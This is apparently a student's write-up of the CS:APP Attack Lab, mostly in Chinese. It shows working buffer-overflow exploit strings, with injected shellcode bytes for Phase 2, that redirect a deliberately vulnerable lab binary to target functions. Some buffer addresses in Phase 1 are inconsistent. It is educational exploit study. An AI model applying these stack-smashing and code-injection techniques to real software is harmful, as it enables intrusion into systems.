-   Phase 1

修改 getbuf 的返回地址，让其调用 touch1.

定位到 buf 的地址在 0x55d1dc78。返回的地址值为 0x401976，存放地址为 0x5561dca0。buf 的长度为 40，类型为 char。

buf 的起始位置是 0x55d1dc78,结束位置是 0x55d1dc9f。所以，先存放 40 个元素，把 buf 占满，然后存放 4017c0 到接下来的 3 个地址。

开头 40 个 char 可以随机。
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40

-   Phase2

inject a small amount of code as part of exploting string. Your task is to get CTARGET to execute the code for touch2 rather than returning to test.

```
void touch2(unsigned val) {
    vlevel = 2;
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: Youcalled touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

通过查看代码，如果传入的参数 val == cookie，那么就成功了。cookie=0x59b997fa。函数传递过程中，第一个参数被存放在寄存器 rdi 中，如何修改寄存器 rdi 的值？通过代码注入的方式。

函数首先进入 test，创建新的栈帧，执行指令之前，rsp 的值为函数返回的地址。这个时候，address of saved rip = rsp。saved rip 即是返回地址。
在 instruction 执行过程中，rsp 的值会发生变化，但是栈帧的最高位，始终保留着返回地址。

函数然后进入 getbuf 函数，同上的道理，新的栈帧被创建，address of saved rip = rsp。指令进入一系列的准备工作，在进入 Gets 之前，rsp 的值发生了变化（为 Gets 准备参数）

进入 Gets 函数，在这个函数中，发生了 buffer overflow，我们的代码在此期间被植入。
首先，saved rip 的值发生变化，从 0x401976（Gets 正常情况下应该返回的地址）修改为了 0x5561dc78（我们想要它返回的地址，即 buffer 的开始位置）。
函数将从 0x5561dc78 开始执行，写入该位置的第一条指令是 movq $0x59b997fa, %rdi，即设置了传入函数的第一个参数。第二条指定是pushq $0x4017ec，执行该指令的过程中，rsq 减去 8 位，将开辟的空间设置为 0x4017ec，此时的 address of saved rip 的值被设置等于 rsp 的值。然后函数执行 ret，ret 会从 rip 的值取出返回地址。跳转到 0x4017ec 执行我们想要的 touch2 函数。

由此可见。函数调用的过程中，主调函数会将自己的下一条指令压入栈顶。然后进入被调函数，被调函数马上紧接着主调函数的栈顶开辟新的栈帧，在对 rsp 进行任何操作之前，rsp 的值刚好等于返回地址的值，即 address of saved rip。然后 rsp 会在被调函数中发生变化。

跳转一共发生了两次。第一次跳转的时候，rsp 指向主调函数，取出 rsp 指向的地址 0x5561dca0 中的值，即返回地址 0x5561dc78，然后 rsp +8，变为 0x5561dca8。然后此时在 pushq 0x4017ec，pushq 首先会将 rsp 的值减小 8 位，设置为 0x5561dca0，此处的值刚好等于 address of saved rip，此处设置需要第二次被跳转的值，即 touch2 的地址 0x4017ec。所以函数能够跳转到 touch2.

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
```

-   Phase3

involves a code injection attack, but passing a string as argument. Your task is to get CTARGET to execute the code for touch3 rather than returning to test.

```
int hexmatch(unsigned val, char* sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char* s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char* sval) {
    vlevel = 3;
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

```

-   include a string representation of cookie in exploit string.
-   a string is represented in C as a sequence of bytes followed by a byte with value 0
-   injected code should set register %rdi to the address of this string.
-   When function hexmatch and strncmp are called, they push data onto the stack, overwriting a portion of memory that held the buffer used by getbuf.

1. 函数调用 touch3. touch3 的地址是 0x4018fa。
2. 0x59b997fa 转换成 ascii 码的字符串，35 39 62 39 39 37 66 61
3. 0x5561dcb8 从这里开始存放。

-   phase4

attack phase2, but do so on program RTARGET using gadgets from the gadgets farm.
